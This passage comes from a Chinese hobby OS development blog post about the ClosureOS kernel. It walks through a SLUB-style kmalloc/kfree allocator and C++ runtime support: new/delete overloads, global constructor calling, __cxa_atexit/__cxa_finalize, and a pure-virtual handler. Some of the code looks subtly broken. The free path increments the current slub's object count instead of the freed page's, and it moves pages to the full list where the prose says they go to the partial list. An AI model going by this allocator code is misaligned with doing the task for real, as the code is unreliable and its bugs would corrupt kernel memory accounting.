进行页面分配请求</li><li>我们使用从 buddy system 分配的一份页面的首个 <code>page</code> 结构体的 <code>page::kc</code> 字段标识其是否属于某个 <code>kmem_cache</code> ，从而区分这两类内存分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (sz &lt;= KMALLOC_MAX_CACHE_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> __kmalloc_normal(sz);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> __kmalloc_large(sz);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-小对象分配：当前-slub-partial-list-buddy-system"><a href="#I-小对象分配：当前-slub-partial-list-buddy-system" class="headerlink" title="I. 小对象分配：当前 slub -&gt; partial list -&gt; buddy system"></a>I. 小对象分配：当前 slub -&gt; partial list -&gt; buddy system</h3><p>对于比较常见的小对象内存分配，我们的策略如下：</p><ul><li>首先向上对齐分配大小，检查对应内存池的当前 freelist 是否仍有对象，若是则直接分配并返回</li><li>若否，检查当前是否有 slub page，若是则将其挂到 full list</li><li>检查 partial list 是否仍有空闲内存页，若是则取下并分配为当前 slub page 并回到第一步</li><li>若 partial list 也为空，向 buddy system 请求内存页，成功则回到第一步，失败则直接返回 NULL</li></ul><p>需要注意的是在我们的设计中内存池应当在多个核之间进行共享，因此所有操作需要全程加锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span> <span class="hljs-title function_">slub_index</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_KOBJECT_SIZE; i++) &#123;<br>        <span class="hljs-keyword">if</span> (sz &lt;= kmem_cache_obj_sz[i]) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> -E2BIG;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Fetch an object from a specific kmem_cache</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @return void* allocated object, NULL for failure</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* __kmem_cache_alloc(<span class="hljs-keyword">struct</span> kmem_cache *kc)<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (!kc) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    spin_lock(&amp;kc-&gt;lock);<br><br>redo:<br>    <span class="hljs-comment">/* we have objects on the kmem_cache now, just allocate one */</span><br>    <span class="hljs-keyword">if</span> (kc-&gt;freelist != <span class="hljs-literal">NULL</span>) &#123;<br>        obj = kc-&gt;freelist;<br>        kc-&gt;freelist = *kc-&gt;freelist;<br>        kc-&gt;slub-&gt;obj_nr--;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* no object on freelist, put the slub page on the full list */</span><br>    <span class="hljs-keyword">if</span> (kc-&gt;slub) &#123;<br>        list_add_next(&amp;kc-&gt;full, &amp;kc-&gt;slub-&gt;<span class="hljs-built_in">list</span>);<br>        kc-&gt;slub = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* try to get the page from partial list */</span><br>    <span class="hljs-keyword">if</span> (!list_empty(&amp;kc-&gt;partial)) &#123;<br>        kc-&gt;slub = container_of(kc-&gt;partial.next, <span class="hljs-keyword">struct</span> page, <span class="hljs-built_in">list</span>);<br>        kc-&gt;freelist = kc-&gt;slub-&gt;freelist;<br>        list_del(&amp;kc-&gt;slub-&gt;<span class="hljs-built_in">list</span>);<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>    <span class="hljs-comment">/* no slub on the partial list, allocated from the buddy */</span><br>    kc-&gt;slub = slub_alloc(kc);<br>    <span class="hljs-keyword">if</span> (kc-&gt;slub) &#123;<br>        kc-&gt;freelist = kc-&gt;slub-&gt;freelist;<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>out:<br>    spin_unlock(&amp;kc-&gt;lock);<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* __kmalloc_normal(<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-type">int</span> slub_idx;<br><br>    slub_idx = slub_index(sz);<br>    <span class="hljs-keyword">if</span> (slub_idx &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> __kmem_cache_alloc(&amp;kmem_cache_list[slub_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在进行新的 slub pages 分配时，我们应当根据当前内存池信息将其分割为相应数量的空闲对象，并将空闲对象链接为单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page* <span class="hljs-title function_">slub_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *kc)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">new_slub</span>;</span><br>    <span class="hljs-type">void</span> *curr_obj;<br>    <span class="hljs-type">virt_addr_t</span> next_obj;<br>    <span class="hljs-type">void</span> **obj_ptr;<br><br>    new_slub = alloc_pages(kc-&gt;slub_order);<br><br>    <span class="hljs-comment">/* trim pages into chunks */</span><br>    <span class="hljs-keyword">if</span> (new_slub) &#123;<br>        next_obj = page_to_virt(new_slub);<br>        curr_obj = <span class="hljs-literal">NULL</span>;<br>        obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; kc-&gt;slub_obj_nr; i++) &#123;<br>            *obj_ptr = curr_obj;<br>            curr_obj = (<span class="hljs-type">void</span>*) next_obj;<br>            next_obj += kc-&gt;obj_size;<br>            obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br>        &#125;<br><br>        new_slub-&gt;obj_nr = kc-&gt;slub_obj_nr;<br>        new_slub-&gt;freelist = curr_obj;<br>        new_slub-&gt;kc = kc;<br>        get_page(new_slub);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> new_slub;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-大内存分配：退化至-buddy-system"><a href="#II-大内存分配：退化至-buddy-system" class="headerlink" title="II. 大内存分配：退化至 buddy system"></a>II. 大内存分配：退化至 buddy system</h3><p>对于较大的内存分配，我们直接将其交由 buddy system 进行分配即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* __kmalloc_large(<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">p</span>;</span><br><br>    p = alloc_pages(sz &gt;&gt; (PAGE_SHIFT + <span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">if</span> (!p) &#123;<br>        <span class="hljs-comment">/* failed to allocate */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    get_page(p);<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*) page_to_virt(p);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对象释放：对象回归与链表迁移"><a href="#内存对象释放：对象回归与链表迁移" class="headerlink" title="内存对象释放：对象回归与链表迁移"></a>内存对象释放：对象回归与链表迁移</h2><p>内存释放的逻辑则简单得多：</p><ul><li>首先根据虚拟地址找到对应的 page 结构体，若不属于任一 <code>kmem_cache</code> 则说明为大内存分配，直接释放回 buddy system</li><li>否则，找到其对应的 <code>kmem_cache</code> ，判断当前 slub page 所属：<ul><li>若为正在使用的 slub page，直接将对象挂回 <code>kmem_cache::freelist</code></li><li>否则，挂回对应 page 的 freelist，若为 full list 则迁移至 partial list</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *kc, <span class="hljs-keyword">struct</span> page *slub, <span class="hljs-type">void</span> *obj)<br>&#123;<br>    spin_lock(&amp;kc-&gt;lock);<br><br>    kc-&gt;slub-&gt;obj_nr++;<br><br>    <span class="hljs-keyword">if</span> (slub == kc-&gt;slub) &#123;<br>        *(<span class="hljs-type">void</span>**) obj = kc-&gt;freelist;<br>        kc-&gt;freelist = obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (slub-&gt;obj_nr == <span class="hljs-number">1</span>) &#123;    <span class="hljs-comment">/* on full list */</span><br>            list_del(&amp;slub-&gt;<span class="hljs-built_in">list</span>);<br>            list_add_next(&amp;kc-&gt;full, &amp;slub-&gt;<span class="hljs-built_in">list</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (slub-&gt;obj_nr == kc-&gt;slub_obj_nr) &#123;   <span class="hljs-comment">/* all freed */</span><br>            list_del(&amp;slub-&gt;<span class="hljs-built_in">list</span>);<br>            put_page(slub);<br>        &#125;<br>    &#125;<br><br>    spin_unlock(&amp;kc-&gt;lock);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span>* object)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">p</span>;</span><br><br>    <span class="hljs-keyword">if</span> (!object) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    p = get_head_page(virt_to_page((<span class="hljs-type">virt_addr_t</span>) object));<br>    <span class="hljs-keyword">if</span> (!p-&gt;kc) &#123;<br>        put_page(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    __kmem_cache_free(p-&gt;kc, p, object);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-C-的初步引入"><a href="#0x04-C-的初步引入" class="headerlink" title="0x04. C++ 的初步引入"></a>0x04. C++ 的初步引入</h1><p>现在我们考虑进行 C++ 代码的引入，笔者选择引入 C++ 代码的主要原因是为了 OOP 特性，虽然说使用 C 同样可以编写面向对象的代码，但是总归没有 C++ 的原生 OOP 看起来那么直观</p><p>在 bare bone 环境下，我们 <strong>无法使用标准库</strong> ，因此此时的 C++ <em>几乎</em> 是相当于 C with class,不过额外多了一些特性：</p><ul><li>隐式的对构造函数与析构函数的调用</li><li>隐式的内存分配与释放</li></ul><p>对于构造函数与析构函数的自动调用，这是由编译器去决定的，因此大部分情况下我们可以不用处理， <strong>除了全局对象的构造函数</strong> —— <strong>我们应当确保其在我们完成内存管理子系统的初始化之后再进行</strong></p><p>对于隐式的内存分配与释放，我们只需要 <strong>重载全局 new&#x2F;delete 运算符即可</strong></p><p>此外，我们应当 <strong>禁用 C++ 的异常处理机制</strong> ，因为这个特性在内核上下文不好实现，同时会引入很多额外的开销，我们通过在编译时添加 <code> -fno-exceptions</code> 以关闭该特性</p><h2 id="new-delete-运算符的重载"><a href="#new-delete-运算符的重载" class="headerlink" title="new&#x2F;delete 运算符的重载"></a>new&#x2F;delete 运算符的重载</h2><p>我们将运算符重载实现在一个单独的头文件 <code>cpp_base.hpp</code> 中，其实我们只需要在 <code>new</code> 中调用 <code>kmalloc()</code> 、在 <code>delete</code> 中调用 <code>kfree()</code> 即可，需要注意的是 C 与 C++ 之间的链接问题，我们应当使用 <code>extern &quot;C&quot;</code> 来为 C++ 代码引入 C ABI：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/compiler.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">kfree</span><span class="hljs-params">(<span class="hljs-type">void</span>* object)</span></span>;<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">kmalloc</span>(sz);<br>&#125;<br><br>__always_inline <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">kmalloc</span>(sz);<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">kfree</span>(p);<br>&#125;<br><br>__always_inline <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p)<br>&#123;<br>    <span class="hljs-built_in">kfree</span>(p);<br>&#125;<br><br><span class="hljs-function">__always_inline <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">kfree</span>(p);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后对于所有的 C++ 代码，我们只需要在开头引入该头文件即可</p><h2 id="global-constructor-的调用"><a href="#global-constructor-的调用" class="headerlink" title="global constructor 的调用"></a>global constructor 的调用</h2><p>在用户态程序中对于全局初始化器（例如全局对象的构造函数，或是 constructor attribute 修饰的函数）的调用通常在 <code>main()</code> 函数前完成（这里我们仅考虑 <code>GCC</code> 编译器），编译器会生成对应的 <strong>调用构造器与析构器的函数</strong> （通常每个文件一个，函数名中带有 <code>static_initialization_and_destruction</code> ），并将这些函数的地址单独存放到一个 <code>.init_array</code> 段，在运行 <code>main()</code> 函数前的 <code>__libc_start_main()</code> 会调用这些函数指针</p><p>因此对于我们的 kernel 环境而言，若要初始化这些全局对象， <strong>我们只需要手动调用这些函数指针即可</strong> ，这里笔者将 <code>.init_array</code> 段放在了 <code>.data</code> 段中，并使用一个外部符号标识其位置：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">ALIGN</span>(4096) : <span class="hljs-type">AT</span> (<span class="hljs-title">__kernel_text_sz</span> + <span class="hljs-title">__boot_end</span>)</span><br>&#123;<br>*(.<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>__init_array = .;<br>*(.init_array)<br></code></pre></td></tr></table></figure><p>之后我们直接引入该符号并调用对应的函数指针即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*__init_array)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">global_constructor_caller</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> (**init_array)(<span class="hljs-type">void</span>) =&amp;__init_array;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; init_array[i]; i++) &#123;<br>        init_array[i]();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="global-destructor-的调用"><a href="#global-destructor-的调用" class="headerlink" title="global destructor 的调用"></a>global destructor 的调用</h2><p>全局析构器的实现则比构造器相对复杂一些，对每个存在全局构造器&#x2F;析构器的文件的 <code>*_static_initialization_and_destruction_*()</code> 函数，其除了调用构造器以外，还会 <strong>进行析构器信息的装填</strong> ，这通过 <code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle)</code> 函数完成，其三个参数分别为：析构函数指针、待析构对象、一个特殊的标记值（对我们来说可以不用管）</p><p>因此我们只需要自行实现一个 <code>__cxa_at_exit</code> 函数来记录析构器信息即可，为了实现动态的析构器数据记录，我们动态分配 <code>dtor_info</code> 结构体来记录待析构对象的信息，并将其链接为单向链表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *next;<br>    <span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">void</span> *__dso_handle;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *global_dtors = <span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-type">int</span> __cxa_atexit(<span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg, <span class="hljs-type">void</span> *__dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *new_info;<br>    <br>    new_info = <span class="hljs-keyword">new</span> <span class="hljs-keyword">struct</span> dtor_info;<br>    <span class="hljs-keyword">if</span> (new_info == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    new_info-&gt;next = global_dtors;<br>    new_info-&gt;destructor = destructor;<br>    new_info-&gt;arg = arg;<br>    new_info-&gt;__dso_handle = __dso_handle;<br><br>    global_dtors = new_info;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此外，我们还需要定义一个 <code>__dso_handle</code> 变量，并导出到我们的 <code>cpp_base.hpp</code> 中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span>* __dso_handle __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;hidden&quot;</span>)));<br></code></pre></td></tr></table></figure><p>接下来是对析构器的调用，在 C++ ABI 规范中，对这些析构器的调用应当由 <code>void __cxa_finalize ( void *__dso_handle)</code> 函数完成，其应当将析构器条目的 <code>__dso_handle</code> 与其参数进行对比，相等则调用析构器（若传参为空则应当调用所有析构器）并将对应的条目无效化，因此在我们的 ClosureOS 内核中也应当实现一个 <code>__cxa_finalize()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">spinlock_t</span> dtor_exit_lock;<br><br><span class="hljs-type">void</span> __cxa_finalize(<span class="hljs-type">void</span>* dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> **pdtor = &amp;global_dtors;<br><br>    <span class="hljs-built_in">spin_lock</span>(&amp;dtor_exit_lock);<br><br>    <span class="hljs-keyword">while</span> (*pdtor) &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *dtor = *pdtor;<br><br>        <span class="hljs-keyword">if</span> (!dso_handle || dtor-&gt;__dso_handle == dso_handle) &#123;<br>            *pdtor = dtor-&gt;next;<br>            dtor-&gt;<span class="hljs-built_in">destructor</span>(dtor-&gt;arg);<br>            <span class="hljs-keyword">delete</span> dtor;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            pdtor = &amp;dtor-&gt;next;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">spin_unlock</span>(&amp;dtor_exit_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是 <strong>这个函数应当在程序退出时进行手动调用</strong> ，由于我们尚未编写电源管理模块，因此本章所涉及的代码不会调用该函数</p><h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>虚函数是 C++ 的一个特性，简而言之其中的纯虚函数是一个类似占位符的存在，当程序调用纯虚函数时程序会报错，在内核环境中我们并没有各种库因此我们需要实现相应的 error handler</p><p>对于 GCC 而言，这个 error handler 应当为 <code>__cxa_pure_virtual()</code> 函数，因此我们只需要在我们的内核中实现该函数即可， <em>目前我们暂且留空</em> ，在后续完成内核输出功能后再添加上类似 <code>printk()</code> 的报错信息输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">void</span> __cxa_pure_virtual()<br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> add error message output</span><br><span class="hljs-comment">    */</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">【OS.0x03】Linux内核内存管理II - Buddy System</a></p><p><a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p><p><a href="https://blogs.oracle.com/linux/post/linux-slub-allocator-internals-and-debugging-1">Linux SLUB Allocator Internals and Debugging, Part 1 of 4</a></p><p><a href="https://wiki.osdev.org/C++">C++ - OS Dev</a></p><p><a href="https://wiki.osdev.org/Calling_Global_Constructors">Calling Global Constructors - OS Dev</a></p><p><a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">Itanium C++ ABI</a></p><p> <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> </p><p><a href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">AMD64 Architecture Programmer’s Manual Volume 2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Good old MEMORIES has gone…&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="内存管理" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="C++" scheme="https://arttnba3.github.io/tags/C/"/>
    
